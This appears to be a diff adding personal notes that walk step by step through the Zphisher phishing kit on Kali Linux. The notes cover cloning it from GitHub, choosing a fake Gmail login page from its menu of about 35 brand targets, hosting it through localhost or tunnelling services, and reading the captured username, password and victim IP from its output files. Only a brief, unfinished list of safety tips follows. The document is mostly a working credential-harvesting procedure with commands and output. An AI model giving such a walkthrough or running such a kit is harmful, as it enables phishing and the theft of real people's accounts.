@@ -1,0 +1,167 @@
+Phishing Attack - Phishing Attack Explained - Phishing Using Kali Linux
+
+---------------------------------------------------
+Phishing - is a type of social engineering technique for 
+gathering sensitive information of target such as a 
+username, password, etc.
+---------------------------------------------------
+Phishing work -
+1. Hacker Create a fake Website
+2.The fake Website sent to the victim
+3.Victim Enters Data
+4. Hacker gets data then
+----------------------------------------------------
+Use phishing tool in kali linux
+-SEoolki
+-Weeman
+-SocialFish
+-Zphisher      [we use this]
+----------------------------------------------------
+Zphisher download link -- 
+https://github.com/htr-tech/zphisher
+https://bit.ly/3o8T59P
+----------------------------------------------------
+open given link 
+code - copy - terminal 
+sudo su
+git clone https://github.com/htr-tech/zphisher.git
+[paste]
+enter
+---------------------------------------------------
+┌──(kali㉿kali)-[~]
+└─$ sudo su                                         
+[sudo] password for kali: 
+┌──(root㉿kali)-[/home/kali]
+--------------------------------
+┌──(root㉿kali)-[~]
+└─# cd /home/kali/Desktop
+                                                                
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# 
+-------------------------------------
+install zphisher here
+
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# git clone https://github.com/htr-tech/zphisher.git 
+-------------------------------------
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# ls
+zphisher
+                                                                
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# cd zphisher 
+--------------------------------------
+┌──(root㉿kali)-[/home/kali/Desktop/zphisher]
+└─# ls
+Dockerfile  make-deb.sh  run-docker.sh  zphisher.sh
+LICENSE     README.md    scripts
+                                                                
+┌──(root㉿kali)-[/home/kali/Desktop/zphisher]
+└─# ./zphisher.sh
+------------------------------------------------
+
+______      _     _     _                                      
+|___  /     | |   (_)   | |                                     
+   / / _ __ | |__  _ ___| |__   ___ _ __                        
+  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|                       
+ / /__| |_) | | | | \__ \ | | |  __/ |                          
+/_____| .__/|_| |_|_|___/_| |_|\___|_|                          
+      | |                                                       
+      |_|                Version : 2.3.5                        
+                                                                
+[-] Tool Created by htr-tech (tahmid.rayat)                     
+                                                                
+[::] Select An Attack For Your Victim [::]                      
+                                                                
+[01] Facebook      [11] Twitch       [21] DeviantArt            
+[02] Instagram     [12] Pinterest    [22] Badoo                 
+[03] Google        [13] Snapchat     [23] Origin                
+[04] Microsoft     [14] Linkedin     [24] DropBox               
+[05] Netflix       [15] Ebay         [25] Yahoo                 
+[06] Paypal        [16] Quora        [26] Wordpress             
+[07] Steam         [17] Protonmail   [27] Yandex                
+[08] Twitter       [18] Spotify      [28] StackoverFlow         
+[09] Playstation   [19] Reddit       [29] Vk                    
+[10] Tiktok        [20] Adobe        [30] XBOX                  
+[31] Mediafire     [32] Gitlab       [33] Github                
+[34] Discord       [35] Roblox                                  
+                                                                
+[99] About         [00] Exit                                    
+                                                                
+[-] Select an option :3
+--------------------------------------------                   
+[01] Gmail Old Login Page                                       
+[02] Gmail New Login Page                                       
+[03] Advanced Voting Poll  -[in which it is asking for a input]
+[-] Select an option :3
+------------------------------------
+                                                
+[01] Localhost                                                  
+[02] Cloudflared  [Auto Detects]                                
+[03] LocalXpose   [NEW! Max 15Min]                              
+                                                                
+[-] Select a port forwarding service : 03
+---------------------------------------------------------
+[01] Localhost                                                  
+[02] Cloudflared  [Auto Detects]                                
+[03] LocalXpose   [NEW! Max 15Min]                              
+                                                                
+[-] Select a port forwarding service : 01                       
+                                                                
+[?] Do You Want A Custom Port [y/N]: N
+--------------------------------------------------------
+[-] Successfully Hosted at : http://127.0.0.1:8080 
+[copy link, paste it in browser]            
+                                                                
+[-] Waiting for Login Info, Ctrl + C to exit...     
+---------------------------------------------------------
+[www.facebook.com, www.facebo0k.com]
+
+page will appear 
+name - select any social site - select color
+---------------------------------------------------------
+output/extracted values -
+           
+[-] Victim IP Found !                                           
+                                                                
+[-] Victim's IP : 127.0.0.1                                     
+                                                                
+[-] Saved in : auth/ip.txt                                      
+                                                                
+[-] Login info Found !!                                         
+                                                                
+[-] Account : hjikjjhkl                                         
+                                                                
+[-] Password : bdfbdf                                           
+                                                                
+[-] Saved in : auth/usernames.dat                               
+                                                                
+[-] Waiting for Next Login Info, Ctrl + C to exit.  
+--------------------------------------------------------         
+press ctrl+c for exit
+┌──(root㉿kali)-[/home/kali/Desktop/zphisher]
+└─# ls
+auth        LICENSE      README.md      scripts
+Dockerfile  make-deb.sh  run-docker.sh  zphisher.sh
+
+-------------------------------------------------------- 
+──(root㉿kali)-[/home/kali/Desktop/zphisher]
+└─# cd auth 
+                                                                
+┌──(root㉿kali)-[/home/kali/Desktop/zphisher/auth]
+└─# ls
+ip.txt  usernames.dat
+--------------------------------------------------------
+┌──(root㉿kali)-[/home/kali/Desktop/zphisher/auth]
+└─# cat ip.txt
+IP: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+--------------------------------------------------------
+┌──(root㉿kali)-[/home/kali/Desktop/zphisher/auth]
+└─# cat usernames.dat
+Gmail Username: hjikjjhkl Pass: bdfbdf
+----------------------------------------------------------
+safety from a phishing attack
+1. first concentrate on the link and watch- the URL or domain 
+[click to get 50% off ]
+2. that should be - https/HTTP
